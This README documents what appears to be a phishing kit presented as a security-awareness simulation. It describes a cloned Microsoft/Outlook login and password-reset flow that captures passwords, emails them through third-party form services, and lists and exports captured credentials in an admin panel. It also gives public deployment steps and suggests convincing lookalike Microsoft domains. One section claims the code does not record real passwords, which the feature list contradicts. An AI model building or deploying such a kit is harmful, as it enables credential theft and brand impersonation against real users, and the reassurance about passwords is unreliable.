# 🔐 Microsoft Login Awareness - Security Awareness Campaign

Educational phishing simulation designed to train employees in identifying fraudulent login pages.

## ⚠️ LEGAL NOTICE

This project is designed **EXCLUSIVELY FOR EDUCATIONAL PURPOSES** within authorized security awareness campaigns. Any malicious use is strictly prohibited.

## 🎯 Purpose

Cybersecurity awareness training platform that simulates Microsoft/Outlook login pages to:
- Train employees to identify phishing attempts
- Demonstrate common social engineering tactics  
- Promote security best practices
- Reduce credential theft risks

## 🚀 Quick Start

### Deploy to Production

**Recommended:** Use Netlify or Vercel for instant HTTPS deployment

1. Fork this repository
2. Connect to [Netlify](https://netlify.com) or [Vercel](https://vercel.com)
3. Deploy with one click
4. Your awareness campaign is live

### Local Development

```bash
# Python 3
python3 -m http.server 8080

# Node.js (with http-server)
npx http-server -p 8080
```

Open browser at `http://localhost:8080`

## 📁 Project Structure

```
├── index.html              # Main login page
├── reset-password.html     # Password reset flow
├── admin.html             # Admin dashboard
├── styles.css             # Login page styles
├── styles-reset.css       # Reset page styles  
├── script.js              # Login capture logic
├── script-reset.js        # Reset capture logic
└── README.md              # Documentation
```

## ✨ Features

- 🎨 Pixel-perfect Microsoft design replica
- 📱 Fully responsive (mobile/desktop)
- 🔒 Credential capture with email notifications
- 📊 Admin dashboard with export functionality
- ⚡ Zero dependencies (vanilla JavaScript)
- 🌐 Multi-language support (EN/ES)
- 🔄 Password reset flow simulation
- 📧 Integration with Web3Forms & Formspree

## 🔐 How It Works

### Login Simulation (`index.html`)
1. User enters email → Validation
2. User enters password → Capture
3. Data stored locally + email notification sent
4. Educational message displayed
5. Optional redirect to real Microsoft login

### Password Reset (`reset-password.html`)
4-step flow mimicking Microsoft's password recovery process with capture at each step.

### Admin Panel (`admin.html`)
- View all captured credentials
- Filter by type (login/reset)
- Export to CSV
- Clear data

## 🚨 Security Education Points

The campaign teaches employees to identify:
- ✅ Suspicious URLs (not microsoft.com)
- ✅ Missing HTTPS certificates
- ✅ Unsolicited email links
- ✅ Urgent/threatening language
- ✅ Grammar/spelling errors

## 📊 Campaign Implementation

### Best Practices:
1. **Authorization**: Get management approval
2. **Notification**: Send simulated phishing email
3. **Tracking**: Monitor captures in admin panel
4. **Follow-up**: Provide training to affected users
5. **No punishment**: Focus on education

### Customization:
- Update email in `script.js` (line with `Web3Forms`)
- Modify educational messages
- Add company branding
- Customize redirect URLs
```
CNAME record: www → cname.vercel-dns.com
```

**Para GitHub Pages:**
```
A records:
185.199.108.153
185.199.109.153
185.199.110.153
185.199.111.153
```

### Recomendación para Campaña Interna

Para que parezca más realista, considera dominios similares a Microsoft:
- ❌ `microsoft-login.tuempresa.com` (demasiado obvio)
- ✅ `microsoftonline-auth.com` (más convincente para prueba)
- ✅ `outlook-secure-login.com`

**Nota**: Asegúrate de que los empleados sepan que es una prueba después de completarla.

## 🧪 Pruebas Recomendadas

1. Prueba en diferentes navegadores (Chrome, Firefox, Safari, Edge)
2. Prueba en dispositivos móviles
3. Verifica que los mensajes educativos sean claros
4. Asegúrate de que el sitio tenga un aviso legal

## 📝 Consideraciones Legales

- ✅ Obtén aprobación de Recursos Humanos y Legal
- ✅ Informa a los empleados que habrá pruebas de seguridad
- ✅ No registres contraseñas reales (este código NO lo hace)
- ✅ Usa solo dentro de tu organización
- ✅ Incluye un aviso de que es una simulación

## 🤝 Contribuciones

Este es un proyecto educativo. Siéntete libre de:
- Mejorar el diseño
- Agregar más idiomas
- Mejorar los mensajes educativos
- Agregar métricas y reportes

## 📧 Configuration

### Email Notifications Setup

1. Get a free API key from [Web3Forms](https://web3forms.com)
2. Update `script.js` and `script-reset.js`:
   ```javascript
   const formData = new FormData();
   formData.append('access_key', 'YOUR_API_KEY_HERE');
   ```
3. Set your notification email in the same files

### Backup Service (Formspree)
Get API key from [Formspree](https://formspree.io) and update the backup endpoint in scripts.

## 📊 Admin Dashboard

Access the admin panel at `/admin.html` to:
- View all captures in real-time
- Export data to CSV
- Clear captured data
- Filter by capture type

## 🤝 Contributing

Contributions are welcome! Please ensure any updates maintain the educational focus and ethical use of this tool.

## 📄 License

This project is for educational purposes only. Use responsibly and only with proper authorization.

---

**Remember**: The goal is education, not entrapment. Cybersecurity is everyone's responsibility.
